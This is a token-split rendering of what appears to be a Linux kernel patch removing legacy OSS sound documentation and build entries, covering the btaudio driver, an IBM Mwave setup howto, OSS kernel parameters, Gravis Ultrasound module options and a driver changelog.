"r6b4", "-", "5", "|", "|", "|", "|", "r8b3", "-", "5", "+", "--", "v", "-", "--", "+", "|", "-", "->", "PreAmp", ">", "-/", "+", "--", "--", "--", "+", "MIC", "R", "(", "electret", "mic", ")", "@", "@", "-", "1", ",", "92", "+", "0", ",", "0", "@", "@", "Intro", "=", "==", "==", "people", "start", "bugging", "me", "about", "this", "with", "questions", ",", "looks", "like", "I", "should", "write", "up", "some", "documentation", "for", "this", "beast", ".", "That", "way", "I", "don", "'", "t", "have", "to", "answer", "that", "much", "mails", "I", "hope", ".", "Yes", ",", "I", "'", "m", "lazy", ".", "..", "You", "might", "have", "noticed", "that", "the", "bt878", "grabber", "cards", "have", "actually", "_two_", "PCI", "functions", ":", "$", "lspci", "[", ".", "..", "]", "00", ":", "0a", ".", "0", "Multimedia", "video", "controller", ":", "Brooktree", "Corporation", "Bt878", "(", "rev", "02", ")", "00", ":", "0a", ".", "1", "Multimedia", "controller", ":", "Brooktree", "Corporation", "Bt878", "(", "rev", "02", ")", "[", ".", "..", "]", "The", "first", "does", "video", ",", "it", "is", "backward", "compatible", "to", "the", "bt848", ".", "The", "second", "does", "audio", ".", "btaudio", "is", "a", "driver", "for", "the", "second", "function", ".", "It", "'", "s", "a", "sound", "driver", "which", "can", "be", "used", "for", "recording", "sound", "(", "and", "_only_", "recording", ",", "no", "playback", ")", ".", "As", "most", "TV", "cards", "come", "with", "a", "short", "cable", "which", "can", "be", "plugged", "into", "your", "sound", "card", "'", "s", "line", "-", "in", "you", "probably", "don", "'", "t", "need", "this", "driver", "if", "all", "you", "want", "to", "do", "is", "just", "watching", "TV", ".", "..", "Driver", "Status", "=", "==", "==", "==", "==", "==", "==", "Still", "somewhat", "experimental", ".", "The", "driver", "should", "work", "stable", ",", "i", ".", "e", ".", "it", "should", "'", "nt", "crash", "your", "box", ".", "It", "might", "not", "work", "as", "expected", ",", "have", "bugs", ",", "not", "being", "fully", "OSS", "API", "compliant", ",", ".", "..", "Latest", "versions", "are", "available", "from", "http", ":", "//", "bytesex", ".", "org", "/", "bttv", "/", ",", "the", "driver", "is", "in", "the", "bttv", "tarball", ".", "Kernel", "patches", "might", "be", "available", "too", ",", "have", "a", "look", "at", "http", ":", "//", "bytesex", ".", "org", "/", "bttv", "/", "listing", ".", "html", ".", "The", "chip", "knows", "two", "different", "modes", ".", "btaudio", "registers", "two", "dsp", "devices", ",", "one", "for", "each", "mode", ".", "They", "can", "not", "be", "used", "at", "the", "same", "time", ".", "Digital", "audio", "mode", "=", "==", "==", "==", "==", "==", "==", "==", "==", "=", "The", "chip", "gives", "you", "16", "bit", "stereo", "sound", ".", "The", "sample", "rate", "depends", "on", "the", "external", "source", "which", "feeds", "the", "bt878", "with", "digital", "sound", "via", "I2S", "interface", ".", "There", "is", "a", "insmod", "option", "(", "rate", ")", "to", "tell", "the", "driver", "which", "sample", "rate", "the", "hardware", "uses", "(", "32000", "is", "the", "default", ")", ".", "One", "possible", "source", "for", "digital", "sound", "is", "the", "msp34xx", "audio", "processor", "chip", "which", "provides", "digital", "sound", "via", "I2S", "with", "32", "kHz", "sample", "rate", ".", "My", "Hauppauge", "board", "works", "this", "way", ".", "The", "Osprey", "-", "200", "reportly", "gives", "you", "digital", "sound", "with", "44100", "Hz", "sample", "rate", ".", "It", "is", "also", "possible", "that", "you", "get", "no", "sound", "at", "all", ".", "analog", "mode", "(", "A", "/", "D", ")", "=", "==", "==", "==", "==", "==", "==", "==", "==", "You", "can", "tell", "the", "driver", "to", "use", "this", "mode", "with", "the", "insmod", "option", "\"", "analog", "=", "1", "\"", ".", "The", "chip", "has", "three", "analog", "inputs", ".", "Consequently", "you", "'", "ll", "get", "a", "mixer", "device", "to", "control", "these", ".", "The", "analog", "mode", "supports", "mono", "only", ".", "Both", "8", "+", "16", "bit", ".", "Both", "are", "_signed_", "int", ",", "which", "is", "uncommon", "for", "the", "8", "bit", "case", ".", "Sample", "rate", "range", "is", "119", "kHz", "to", "448", "kHz", ".", "Yes", ",", "the", "number", "of", "digits", "is", "correct", ".", "The", "driver", "supports", "downsampling", "by", "powers", "of", "two", ",", "so", "you", "can", "ask", "for", "more", "usual", "sample", "rates", "like", "44", "kHz", "too", ".", "With", "my", "Hauppauge", "I", "get", "noisy", "sound", "on", "the", "second", "input", "(", "mapped", "to", "line2", "by", "the", "mixer", "device", ")", ".", "Others", "get", "a", "useable", "signal", "on", "line1", ".", "some", "examples", "=", "==", "==", "==", "==", "==", "==", "*", "read", "audio", "data", "from", "btaudio", "(", "dsp2", ")", ",", "send", "to", "es1730", "(", "dsp", ",", "dsp1", ")", ":", "$", "sox", "-", "w", "-", "r", "32000", "-", "t", "ossdsp", "/", "dev", "/", "dsp2", "-", "t", "ossdsp", "/", "dev", "/", "dsp", "*", "read", "audio", "data", "from", "btaudio", ",", "send", "to", "esound", "daemon", "(", "which", "might", "be", "running", "on", "another", "host", ")", ":", "$", "sox", "-", "c", "2", "-", "w", "-", "r", "32000", "-", "t", "ossdsp", "/", "dev", "/", "dsp2", "-", "t", "sw", "-", "|", "esdcat", "-", "r", "32000", "$", "sox", "-", "c", "1", "-", "w", "-", "r", "32000", "-", "t", "ossdsp", "/", "dev", "/", "dsp2", "-", "t", "sw", "-", "|", "esdcat", "-", "m", "-", "r", "32000", "Have", "fun", ",", "Gerd", "Gerd", "Knorr", "<", "kraxel", "@", "bytesex", ".", "org", ">", "@", "@", "-", "1", ",", "185", "+", "0", ",", "0", "@", "@", "How", "to", "try", "to", "survive", "an", "IBM", "Mwave", "under", "Linux", "SB", "drivers", "+", "IBM", "have", "now", "released", "documentation", "of", "sorts", "and", "Torsten", "is", "busy", "trying", "to", "make", "the", "Mwave", "work", ".", "This", "is", "not", "however", "a", "trivial", "task", ".", "OK", ",", "first", "thing", "-", "the", "IRQ", "problem", "IS", "a", "problem", ",", "whether", "the", "test", "is", "bypassed", "or", "not", ".", "It", "is", "NOT", "a", "Linux", "problem", ",", "but", "an", "MWAVE", "problem", "that", "is", "fixed", "with", "the", "latest", "MWAVE", "patches", ".", "So", ",", "in", "other", "words", ",", "don", "'", "t", "bypass", "the", "test", "for", "MWAVES", "!", "I", "have", "Windows", "95", "on", "/", "dev", "/", "hda1", ",", "swap", "on", "/", "dev", "/", "hda2", ",", "and", "Red", "Hat", "5", "on", "/", "dev", "/", "hda3", ".", "The", "steps", ",", "then", ":", "Boot", "to", "Linux", ".", "Mount", "Windows", "95", "file", "system", "(", "assume", "mount", "point", "=", "/", "dos95", ")", ".", "mkdir", "/", "dos95", "/", "linux", "mkdir", "/", "dos95", "/", "linux", "/", "boot", "mkdir", "/", "dos95", "/", "linux", "/", "boot", "/", "parms", "Copy", "the", "kernel", ",", "any", "initrd", "image", ",", "and", "loadlin", "to", "/", "dos95", "/", "linux", "/", "boot", "/", ".", "Reboot", "to", "Windows", "95", ".", "Edit", "C", ":", "/", "msdos", ".", "sys", "and", "add", "or", "change", "the", "following", ":", "Logo", "=", "0", "BootGUI", "=", "0", "Note", "that", "msdos", ".", "sys", "is", "a", "text", "file", "but", "it", "needs", "to", "be", "made", "'", "unhidden", "'", ",", "readable", "and", "writable", "before", "it", "can", "be", "edited", ".", "This", "can", "be", "done", "with", "DOS", "'", "\"", "attrib", "\"", "command", ".", "Edit", "config", ".", "sys", "to", "have", "multiple", "config", "menus", ".", "I", "have", "one", "for", "windows", "95", "and", "five", "for", "Linux", ",", "like", "this", ":", "[", "menu", "]", "menuitem", "=", "W95", ",", "Windows", "95", "menuitem", "=", "LINTP", ",", "Linux", "-", "ThinkPad", "menuitem", "=", "LINTP3", ",", "Linux", "-", "ThinkPad", "Console", "menuitem", "=", "LINDOC", ",", "Linux", "-", "Docked", "menuitem", "=", "LINDOC3", ",", "Linux", "-", "Docked", "Console", "menuitem", "=", "LIN1", ",", "Linux", "-", "Single", "User", "Mode", "REM", "menudefault", "=", "W95", ",", "10", "[", "W95", "]", "[", "LINTP", "]", "[", "LINDOC", "]", "[", "LINTP3", "]", "[", "LINDOC3", "]", "[", "LIN1", "]", "[", "COMMON", "]", "FILES", "=", "30", "REM", "Please", "read", "README", ".", "TXT", "in", "C", ":", "\\", "MWW", "subdirectory", "before", "changing", "the", "DOS", "=", "statement", ".", "DOS", "=", "HIGH", ",", "UMB", "DEVICE", "=", "C", ":", "\\", "MWW", "\\", "MANAGER", "\\", "MWD50430", ".", "EXE", "SHELL", "=", "c", ":", "\\", "command", ".", "com", "/", "e", ":", "2048", "The", "important", "things", "are", "the", "SHELL", "and", "DEVICE", "statements", ".", "Then", "change", "autoexec", ".", "bat", ".", "Basically", "everything", "in", "there", "originally", "should", "be", "done", "ONLY", "when", "Windows", "95", "is", "booted", ".", "Then", "you", "add", "new", "things", "specifically", "for", "Linux", ".", "Mine", "is", "as", "follows", "@", "ECHO", "OFF", "if", "\"", "%", "CONFIG", "%", "\"", "=", "=", "\"", "W95", "\"", "goto", "W95", "REM", "REM", "Linux", "stuff", "REM", "SET", "MWPATH", "=", "C", ":", "\\", "MWW", "\\", "DLL", ";", "C", ":", "\\", "MWW", "\\", "MWGAMES", ";", "C", ":", "\\", "MWW", "\\", "DSP", "SET", "BLASTER", "=", "A220", "I5", "D1", "SET", "MWROOT", "=", "C", ":", "\\", "MWW", "SET", "LIBPATH", "=", "C", ":", "\\", "MWW", "\\", "DLL", "SET", "PATH", "=", "C", ":", "\\", "WINDOWS", ";", "C", ":", "\\", "MWW", "\\", "DLL", ";", "CALL", "MWAVE", "START", "NOSHOW", "c", ":", "\\", "linux", "\\", "boot", "\\", "loadlin", ".", "exe", "@", "c", ":", "\\", "linux", "\\", "boot", "\\", "parms", "\\", "%", "CONFIG", "%", ".", "par", ":", "W95", "REM", "REM", "Windows", "95", "stuff", "REM", "c", ":", "\\", "toolkit", "\\", "guard", "SET", "MSINPUT", "=", "C", ":", "\\", "MSINPUT", "SET", "MWPATH", "=", "C", ":", "\\", "MWW", "\\", "DLL", ";", "C", ":", "\\", "MWW", "\\", "MWGAMES", ";", "C", ":", "\\", "MWW", "\\", "DSP", "REM", "The", "following", "is", "used", "by", "DOS", "games", "to", "recognize", "Sound", "Blaster", "hardware", ".", "REM", "If", "hardware", "settings", "are", "changed", ",", "please", "change", "this", "line", "as", "well", ".", "REM", "See", "the", "Mwave", "README", "file", "for", "instructions", ".", "SET", "BLASTER", "=", "A220", "I5", "D1", "SET", "MWROOT", "=", "C", ":", "\\", "MWW", "SET", "LIBPATH", "=", "C", ":", "\\", "MWW", "\\", "DLL", "SET", "PATH", "=", "C", ":", "\\", "WINDOWS", ";", "C", ":", "\\", "WINDOWS", "\\", "COMMAND", ";", "E", ":", "\\", "ORAWIN95", "\\", "BIN", ";", "f", ":", "\\", "msdev", "\\", "bin", ";", "e", ":", "\\", "v30", "\\", "bin", ".", "dbg", ";", "v", ":", "\\", "devt", "\\", "v30", "\\", "bin", ";", "c", ":", "\\", "JavaSDK", "\\", "Bin", ";", "C", ":", "\\", "MWW", "\\", "DLL", ";", "SET", "INCLUDE", "=", "f", ":", "\\", "MSDEV", "\\", "INCLUDE", ";", "F", ":", "\\", "MSDEV", "\\", "MFC", "\\", "INCLUDE", "SET", "LIB", "=", "F", ":", "\\", "MSDEV", "\\", "LIB", ";", "F", ":", "\\", "MSDEV", "\\", "MFC", "\\", "LIB", "win", "Now", "build", "a", "file", "in", "c", ":", "\\", "linux", "\\", "boot", "\\", "parms", "for", "each", "Linux", "config", "that", "you", "have", ".", "For", "example", ",", "my", "LINDOC3", "config", "is", "for", "a", "docked", "Thinkpad", "at", "runlevel", "3", "with", "no", "initrd", "image", ",", "and", "has", "a", "parameter", "file", "named", "LINDOC3", ".", "PAR", "in", "c", ":", "\\", "linux", "\\", "boot", "\\", "parms", ":", "#", "LOADLIN", "@", "param_file", "image", "=", "other_image", "root", "=", "/", "dev", "/", "other", "#", "#", "Linux", "Console", "in", "docking", "station", "#", "c", ":", "\\", "linux", "\\", "boot", "\\", "zImage", ".", "krn", "#", "First", "value", "must", "be", "filename", "of", "Linux", "kernel", ".", "root", "=", "/", "dev", "/", "hda3", "#", "device", "which", "gets", "mounted", "as", "root", "FS", "ro", "#", "Other", "kernel", "arguments", "go", "here", ".", "apm", "=", "off", "doc", "=", "yes", "3", "The", "doc", "=", "yes", "parameter", "is", "an", "environment", "variable", "used", "by", "my", "init", "scripts", ",", "not", "a", "kernel", "argument", ".", "However", ",", "the", "apm", "=", "off", "parameter", "IS", "a", "kernel", "argument", "!", "APM", ",", "at", "least", "in", "my", "setup", ",", "causes", "the", "kernel", "to", "crash", "when", "loaded", "via", "loadlin", "(", "but", "NOT", "when", "loaded", "via", "LILO", ")", ".", "The", "APM", "stuff", "COULD", "be", "forced", "out", "of", "the", "kernel", "via", "the", "kernel", "compile", "options", ".", "Instead", ",", "I", "got", "an", "unofficial", "patch", "to", "the", "APM", "drivers", "that", "allows", "them", "to", "be", "dynamically", "deactivated", "via", "kernel", "arguments", ".", "Whatever", "you", "chose", "to", "document", ",", "APM", ",", "it", "seems", ",", "MUST", "be", "off", "for", "setups", "like", "mine", ".", "Now", "make", "sure", "C", ":", "\\", "MWW", "\\", "MWCONFIG", ".", "REF", "looks", "like", "this", ":", "[", "NativeDOS", "]", "Default", "=", "SB1", ".", "5", "SBInputSource", "=", "CD", "SYNTH", "=", "FM", "QSound", "=", "OFF", "Reverb", "=", "OFF", "Chorus", "=", "OFF", "ReverbDepth", "=", "5", "ChorusDepth", "=", "5", "SBInputVolume", "=", "5", "SBMainVolume", "=", "10", "SBWaveVolume", "=", "10", "SBSynthVolume", "=", "10", "WaveTableVolume", "=", "10", "AudioPowerDriver", "=", "ON", "[", "FastCFG", "]", "Show", "=", "No", "HideOption", "=", "Off", "OR", "the", "Default", "=", "line", "COULD", "be", "Default", "=", "SBPRO", "Reboot", "to", "Windows", "95", "and", "choose", "Linux", ".", "When", "booted", ",", "use", "sndconfig", "to", "configure", "the", "sound", "modules", "and", "voil", "\u00e0", "-", "ThinkPad", "sound", "with", "Linux", ".", "Now", "the", "gotchas", "-", "you", "can", "either", "have", "CD", "sound", "OR", "Mixers", "but", "not", "both", ".", "That", "'", "s", "a", "problem", "with", "the", "SB1", ".", "5", "(", "CD", "sound", ")", "or", "SBPRO", "(", "Mixers", ")", "settings", ".", "No", "one", "knows", "why", "this", "is", "!", "For", "some", "reason", "MPEG3", "files", ",", "when", "played", "through", "mpg123", ",", "sound", "like", "they", "are", "playing", "at", "1", "/", "8th", "speed", "-", "not", "very", "useful", "!", "If", "you", "have", "ANY", "insight", "on", "why", "this", "second", "thing", "might", "be", "happening", ",", "I", "would", "be", "grateful", ".", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "Martin", "John", "Bartlett", "_", "/", "_", "/", "_", "/", "_", "/", "(", "martin", "@", "nitram", ".", "demon", ".", "co", ".", "uk", ")", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "_", "/", "=", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "@", "@", "-", "1", ",", "51", "+", "0", ",", "0", "@", "@", "OSS", "Kernel", "Parameters", "~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "~~", "See", "Documentation", "/", "admin", "-", "guide", "/", "kernel", "-", "parameters", ".", "rst", "for", "general", "information", "on", "specifying", "module", "parameters", ".", "This", "document", "may", "not", "be", "entirely", "up", "to", "date", "and", "comprehensive", ".", "The", "command", "\"", "modinfo", "-", "p", "$", "{", "modulename", "}", "\"", "shows", "a", "current", "list", "of", "all", "parameters", "of", "a", "loadable", "module", ".", "Loadable", "modules", ",", "after", "being", "loaded", "into", "the", "running", "kernel", ",", "also", "reveal", "their", "parameters", "in", "/", "sys", "/", "module", "/", "${", "modulename", "}", "/", "parameters", "/", ".", "Some", "of", "these", "parameters", "may", "be", "changed", "at", "runtime", "by", "the", "command", "\"", "echo", "-", "n", "$", "{", "value", "}", ">", "/", "sys", "/", "module", "/", "${", "modulename", "}", "/", "parameters", "/", "${", "parm", "}", "\".", "ad1848", "=", "[", "HW", ",", "OSS", "]", "Format", ":", "<", "io", ">", ",<", "irq", ">", ",<", "dma", ">", ",<", "dma2", ">", ",<", "type", ">", "aedsp16", "=", "[", "HW", ",", "OSS", "]", "Audio", "Excel", "DSP", "16", "Format", ":", "<", "io", ">", ",<", "irq", ">", ",<", "dma", ">", ",<", "mss_io", ">", ",<", "mpu_io", ">", ",<", "mpu_irq", ">", "See", "also", "header", "of", "sound", "/", "oss", "/", "aedsp16", ".", "c", ".", "dmasound", "=", "[", "HW", ",", "OSS", "]", "Sound", "subsystem", "buffers", "mpu401", "=", "[", "HW", ",", "OSS", "]", "Format", ":", "<", "io", ">", ",<", "irq", ">", "opl3", "=", "[", "HW", ",", "OSS", "]", "Format", ":", "<", "io", ">", "pas2", "=", "[", "HW", ",", "OSS", "]", "Format", ":", "<", "io", ">", ",<", "irq", ">", ",<", "dma", ">", ",<", "dma16", ">", ",<", "sb_io", ">", ",<", "sb_irq", ">", ",<", "sb_dma", ">", ",<", "sb_dma16", ">", "pss", "=", "[", "HW", ",", "OSS", "]", "Personal", "Sound", "System", "(", "ECHO", "ESC614", ")", "Format", ":", "<", "io", ">", ",<", "mss_io", ">", ",<", "mss_irq", ">", ",<", "mss_dma", ">", ",<", "mpu_io", ">", ",<", "mpu_irq", ">", "sscape", "=", "[", "HW", ",", "OSS", "]", "Format", ":", "<", "io", ">", ",<", "irq", ">", ",<", "dma", ">", ",<", "mpu_io", ">", ",<", "mpu_irq", ">", "trix", "=", "[", "HW", ",", "OSS", "]", "MediaTrix", "AudioTrix", "Pro", "Format", ":", "<", "io", ">", ",<", "irq", ">", ",<", "dma", ">", ",<", "dma2", ">", ",<", "sb_io", ">", ",<", "sb_irq", ">", ",<", "sb_dma", ">", ",<", "mpu_io", ">", ",<", "mpu_irq", ">", "uart401", "=", "[", "HW", ",", "OSS", "]", "Format", ":", "<", "io", ">", ",<", "irq", ">", "uart6850", "=", "[", "HW", ",", "OSS", "]", "Format", ":", "<", "io", ">", ",<", "irq", ">", "waveartist", "=", "[", "HW", ",", "OSS", "]", "Format", ":", "<", "io", ">", ",<", "irq", ">", ",<", "dma", ">", ",<", "dma2", ">", "@", "@", "-", "1", ",", "30", "+", "0", ",", "0", "@", "@", "modprobe", "sound", "insmod", "ad1848", "insmod", "gus", "io", "=", "*", "irq", "=", "*", "dma", "=", "*", ".", "..", "This", "loads", "the", "driver", "for", "the", "Gravis", "Ultrasound", "family", "of", "sound", "cards", ".", "The", "gus", "module", "takes", "the", "following", "arguments", "io", "I", "/", "O", "address", "of", "the", "Ultrasound", "card", "(", "eg", ".", "io", "=", "0x220", ")", "irq", "IRQ", "of", "the", "Sound", "Blaster", "card", "dma", "DMA", "channel", "for", "the", "Sound", "Blaster", "dma16", "2nd", "DMA", "channel", ",", "only", "needed", "for", "full", "duplex", "operation", "type", "1", "for", "PnP", "card", "gus16", "1", "for", "using", "16", "bit", "sampling", "daughter", "board", "no_wave_dma", "Set", "to", "disable", "DMA", "usage", "for", "wavetable", "(", "see", "note", ")", "db16", "?", "??", "no_wave_dma", "option", "This", "option", "defaults", "to", "a", "value", "of", "0", ",", "which", "allows", "the", "Ultrasound", "wavetable", "DSP", "to", "use", "DMA", "for", "playback", "and", "downloading", "samples", ".", "This", "is", "the", "same", "as", "the", "old", "behaviour", ".", "If", "set", "to", "1", ",", "no", "DMA", "is", "needed", "for", "downloading", "samples", ",", "and", "allows", "owners", "of", "a", "GUS", "MAX", "to", "make", "use", "of", "simultaneous", "digital", "audio", "(", "/", "dev", "/", "dsp", ")", ",", "MIDI", ",", "and", "wavetable", "playback", ".", "If", "you", "have", "problems", "in", "recording", "with", "GUS", "MAX", ",", "you", "could", "try", "to", "use", "just", "one", "8", "bit", "DMA", "channel", ".", "Recording", "will", "not", "work", "with", "one", "DMA", "channel", "if", "it", "'", "s", "a", "16", "bit", "one", ".", "@", "@", "-", "527", ",", "11", "+", "527", ",", "6", "@", "@", "W", ":", "http", ":", "//", "ez", ".", "analog", ".", "com", "/", "community", "/", "linux", "-", "device", "-", "drivers", "AEDSP16", "DRIVER", "M", ":", "Riccardo", "Facchetti", "<", "fizban", "@", "tin", ".", "it", ">", "S", ":", "Maintained", "F", ":", "sound", "/", "oss", "/", "aedsp16", ".", "c", "MULTISOUND", "SOUND", "DRIVER", "M", ":", "Andrew", "Veliath", "<", "andrewtv", "@", "usa", ".", "net", ">", "S", ":", "Maintained", "F", ":", "Documentation", "/", "sound", "/", "oss", "/", "MultiSound", "F", ":", "sound", "/", "oss", "/", "msnd", "*", "than", "an", "occasional", "beep", ",", "say", "Y", ".", "Be", "sure", "to", "have", "all", "the", "information", "about", "your", "sound", "card", "and", "its", "configuration", "down", "(", "I", "/", "O", "port", ",", "interrupt", "and", "DMA", "channel", ")", ",", "because", "you", "will", "be", "asked", "for", "it", ".", "You", "want", "to", "read", "the", "Sound", "-", "HOWTO", ",", "available", "from", "<", "http", ":", "//", "www", ".", "tldp", ".", "org", "/", "docs", ".", "html", "#", "howto", ">", ".", "General", "information", "about", "the", "modular", "sound", "system", "is", "contained", "in", "the", "files", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "Introduction", ">", ".", "The", "file", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "README", ".", "OSS", ">", "contains", "some", "slightly", "outdated", "but", "still", "useful", "information", "as", "well", ".", "Newer", "sound", "driver", "documentation", "is", "found", "in", "<", "file", ":", "Documentation", "/", "sound", "/", "alsa", "/", "*>", ".", "If", "you", "have", "a", "PnP", "sound", "card", "and", "you", "want", "to", "configure", "it", "at", "boot", "time", "using", "the", "ISA", "PnP", "tools", "(", "read", "<", "http", ":", "//", "www", ".", "roestock", ".", "demon", ".", "co", ".", "uk", "/", "isapnptools", "/", ">)", ",", "then", "you", "need", "to", "compile", "the", "sound", "card", "support", "as", "a", "module", "and", "load", "that", "module", "after", "the", "PnP", "configuration", "is", "finished", ".", "To", "do", "this", ",", "choose", "M", "here", "and", "read", "<", "file", ":", "Documentation", "/", "sound", "/", "oss", "/", "README", ".", "modules", ">", ";", "the", "module", "will", "be", "called", "soundcore", ".", "menuconfig", "SOUND_PRIME", "tristate", "\"", "Open", "Sound", "System", "(", "DEPRECATED", ")", "\"", "select", "SOUND_OSS_CORE", "depends", "on", "BROKEN", "help", "Say", "'", "Y", "'", "or", "'", "M", "'", "to", "enable", "Open", "Sound", "System", "drivers", ".", "if", "SOUND_PRIME", "source", "\"", "sound", "/", "oss", "/", "Kconfig", "\"", "endif", "#", "SOUND_PRIME", "obj", "-", "$(", "CONFIG_SOUND_PRIME", ")", "+", "=", "oss", "/", "obj", "-", "$(", "CONFIG_DMASOUND", ")", "+", "=", "oss", "/", "Note", "these", "changes", "relate", "to", "Hannu", "'", "s", "code", "and", "don", "'", "t", "include", "the", "changes", "made", "outside", "of", "this", "for", "modularising", "the", "sound", "Changelog", "for", "version", "3", ".", "8o", "Since", "3", ".", "8h", "Included", "support", "for", "OPL3", "-", "SA1", "and", "SoftOSS", "Since", "3", ".", "8", "Fixed", "SNDCTL_DSP_GETOSPACE", "Compatibility", "fixes", "for", "Linux", "2", ".", "1", ".", "47", "Since", "3", ".", "8", "-", "beta21", "Fixed", "all", "known", "bugs", "(", "I", "think", ")", ".", "Since", "3", ".", "8", "-", "beta8", "Lot", "of", "fixes", "to", "audio", "playback", "code", "in", "dmabuf", ".", "c", "Since", "3", ".", "8", "-", "beta6", "Fixed", "the", "famous", "Quake", "delay", "bug", ".", "Since", "3", ".", "8", "-", "beta5", "Fixed", "many", "bugs", "in", "audio", "playback", ".", "Since", "3", ".", "8", "-", "beta4", "Just", "minor", "changes", ".", "Since", "3", ".", "8", "-", "beta1", "Major", "rewrite", "of", "audio", "playback", "handling", ".", "Added", "AWE32", "support", "by", "Takashi", "Iwai", "(", "in", ".", "/", "lowlevel", "/", ").", "Since", "3", ".", "7", "-", "beta", "#", "Passing", "of", "ioctl", "(", ")", "parameters", "between", "soundcard", ".", "c", "and", "other", "modules", "has", "been", "changed", "so", "that", "arg", "always", "points", "to", "kernel", "space", ".", "Some", "bugfixes", ".", "Since", "3", ".", "7", "-", "beta5", "Disabled", "MIDI", "input", "with", "GUS", "PnP", "(", "Interwave", ")", ".", "There", "seems", "to", "be", "constant", "stream", "of", "received", "0x00", "bytes", "when", "the", "MIDI", "receiver", "is", "enabled", ".", "Since", "3", ".", "5", "Changes", "almost", "everywhere", ".", "Support", "for", "OPTi", "82C924", "-", "based", "sound", "cards", ".", "Since", "3", ".", "5", ".", "4", "-", "beta8", "Fixed", "a", "bug", "in", "handling", "of", "non", "-", "fragment", "sized", "writes", "in", "16", "bit", "/", "stereo", "mode", "with", "GUS", ".", "Limited", "minimum", "fragment", "size", "with", "some", "audio", "devices", "(", "GUS", "=", "512", "and", "SB", "=", "32", ")", ".", "These", "devices", "require", "more", "time", "to", "\"", "recover", "\"", "from", "processing", "of", "each", "fragment", ".", "Since", "3", ".", "5", ".", "4", "-", "beta6", "/", "7", "There", "seems", "to", "be", "problems", "in", "the", "OPTi", "82C930", "so", "cards", "based", "on", "this", "chip", "don", "'", "t", "necessarily", "work", "yet", ".", "There", "are", "problems", "in", "detecting", "the", "MIDI", "interface", ".", "Also", "mixer", "volumes", "may", "be", "seriously", "wrong", "on", "some", "systems", ".", "You", "can", "safely", "use", "this", "driver", "version", "with", "C930", "if", "it", "looks", "to", "work", ".", "However", "please", "don", "'", "t", "complain", "if", "you", "have", "problems", "with", "it", ".", "C930", "support", "should", "be", "fixed", "in", "future", "releases", ".", "Got", "initialization", "of", "GUS", "PnP", "to", "work", ".", "With", "this", "version", "GUS", "PnP", "should", "work", "in", "GUS", "compatible", "mode", "after", "initialization", "using", "isapnptools", ".", "Fixed", "a", "bug", "in", "handling", "of", "full", "duplex", "cards", "in", "write", "only", "mode", ".", "This", "has", "been", "causing", "\"", "audio", "device", "opening", "\"", "errors", "with", "RealAudio", "player", ".", "Since", "3", ".", "5", ".", "4", ".", "beta5", "Changes", "to", "OPTi", "82C930", "driver", ".", "Major", "changes", "to", "the", "Soundscape", "driver", ".", "The", "driver", "requires", "now", "just", "one", "DMA", "channel", ".", "The", "extra", "audio", "/", "dsp", "device", "(", "the", "\"", "Not", "functional", "\"", "one", ")", "used", "for", "code", "download", "in", "the", "earlier", "versions", "has", "been", "eliminated", ".", "There", "is", "now", "just", "one", "/", "dev", "/", "dsp", "#", "device", "which", "is", "used", "both", "for", "code", "download", "and", "audio", ".", "Since", "3", ".", "5", ".", "4", ".", "beta4", "Minor", "changes", ".", "Since", "3", ".", "5", ".", "4", "-", "beta2", "Fixed", "silent", "playback", "with", "ESS", "688", "/", "1688", ".", "Got", "SB16", "to", "work", "without", "the", "16", "bit", "DMA", "channel", "(", "only", "the", "8", "bit", "one", "is", "required", "for", "8", "and", "16", "bit", "modes", ")", ".", "Added", "the", "\"", "lowlevel", "\"", "subdirectory", "for", "additional", "low", "level", "drivers", "that", "are", "not", "part", "of", "USS", "core", ".", "See", "lowlevel", "/", "README", "for", "more", "info", ".", "Included", "support", "for", "ACI", "mixer", "(", "by", "Markus", "Kuhn", ")", ".", "ACI", "is", "a", "mixer", "used", "in", "miroPCM", "sound", "cards", ".", "See", "lowlevel", "/", "aci", ".", "readme", "for", "more", "info", ".", "Support", "for", "Aztech", "Washington", "chipset", "(", "AZT2316", "ASIC", ")", ".", "Since", "3", ".", "5", ".", "4", "-", "beta1", "Reduced", "clicking", "with", "AD1848", ".", "Support", "for", "OPTi", "82C930", ".", "Only", "half", "duplex", "at", "this", "time", ".", "16", "bit", "playback", "is", "sometimes", "just", "white", "noise", "(", "occurs", "randomly", ")", ".", "Since", "3", ".", "5", ".", "2", "Major", "changes", "to", "the", "SB", "/", "Jazz16", "/", "ESS", "driver", "(", "most", "parts", "rewritten", ")", ".", "The", "most", "noticeable", "new", "feature", "is", "support", "for", "multiple", "SB", "cards", "at", "the", "same", "time", ".", "Renamed", "sb16_midi", ".", "c", "to", "uart401", ".", "c", ".", "Also", "modified", "it", "to", "work", "also", "with", "other", "MPU401", "UART", "compatible", "cards", "than", "SB16", "/", "ESS", "/", "Jazz", ".", "Some", "changes", "which", "reduce", "clicking", "in", "audio", "playback", ".", "Copying", "policy", "is", "now", "GPL", ".", "Since", "3", ".", "5", ".", "1", "TB", "Maui", "initialization", "support", "Since", "3", ".", "5", "Improved", "handling", "of", "playback", "underrun", "situations", ".", "Since", "3", ".", "5", "-", "beta10", "Bug", "fixing", "Since", "3", ".", "5", "-", "beta9", "Fixed", "for", "compatibility", "with", "Linux", "1", ".", "3", ".", "70", "and", "later", ".", "Changed", "boot", "time", "passing", "of", "16", "bit", "DMA", "channel", "number", "to", "SB", "driver", ".", "Since", "3", ".", "5", "-", "beta8", "Minor", "changes", "Since", "3", ".", "5", "-", "beta7", "enhancements", "to", "configure", "program", "(", "by", "Jeff", "Tranter", ")", ":", "-", "prompts", "are", "in", "same", "format", "as", "1", ".", "3", ".", "x", "Linux", "kernel", "config", "program", "-", "on", "-", "line", "help", "for", "each", "question", "-", "fixed", "some", "compile", "warnings", "detected", "by", "gcc", "/", "g", "+", "+", "-", "Wall", "-", "minor", "grammatical", "changes", 